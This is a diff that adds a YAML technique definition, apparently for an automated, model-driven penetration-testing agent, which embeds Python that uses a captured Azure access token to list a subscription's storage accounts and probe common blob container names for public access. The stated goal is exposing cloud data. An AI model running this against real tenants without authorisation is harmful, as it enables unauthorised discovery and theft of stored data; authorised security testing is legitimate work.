@@ -1,0 +1,57 @@
+name: azure_storage_enum
+category: cloud
+description: Enumerate Azure storage accounts and check for public blob access
+preconditions:
+- cloud.azure_token_available
+parameters:
+  access_token: from_finding.azure_access_token
+  subscription_id: from_finding.azure_subscription_id
+  target_domain: from_engagement.target_domain
+command_template: >
+  python3 -c "
+  import urllib.request, json, re, subprocess
+
+  token = '{access_token}'
+  sub_id = '{subscription_id}'
+  domain = '{target_domain}'.replace('.','-')[:20]
+
+  headers = {'Authorization': f'Bearer {token}'}
+
+  # List storage accounts in subscription
+  url = f'https://management.azure.com/subscriptions/{sub_id}/providers/Microsoft.Storage/storageAccounts?api-version=2022-09-01'
+  try:
+      req = urllib.request.Request(url, headers=headers)
+      with urllib.request.urlopen(req, timeout=15) as r:
+          data = json.loads(r.read())
+      accounts = data.get('value', [])
+      print(f'Found {len(accounts)} storage accounts')
+      for acc in accounts[:5]:
+          name = acc['name']
+          print(f'  Account: {name}')
+          # Try public access
+          for container in ['data','backup','public','uploads','assets']:
+              pub_url = f'https://{name}.blob.core.windows.net/{container}?restype=container&comp=list'
+              try:
+                  with urllib.request.urlopen(pub_url, timeout=5) as r:
+                      print(f'    [!] PUBLIC container: {container} at {pub_url}')
+              except: pass
+  except Exception as e:
+      print(f'Error: {e}')
+  "
+parser: generic_parser
+expected_effects:
+- azure_storage_enumerated
+- cloud_data_exposed
+falsifier:
+  pattern: Unauthorized|AuthorizationFailed|subscription not found
+  timeout: 30
+model_tier: haiku
+mechanism: >
+  Azure Blob Storage containers with public access level set to 'Blob' or 'Container'
+  are readable without credentials. Enumerate storage accounts via ARM API, then probe
+  common container names for anonymous access. Storage accounts can hold backup files,
+  application data, PII, and SAS tokens granting further access. Also check for
+  static website hosting ($web container) which bypasses network ACLs.
+hacktricks_ref: cloud-security/azure-security/az-azure-storage-security.md
+destructive: false
+opsec: medium
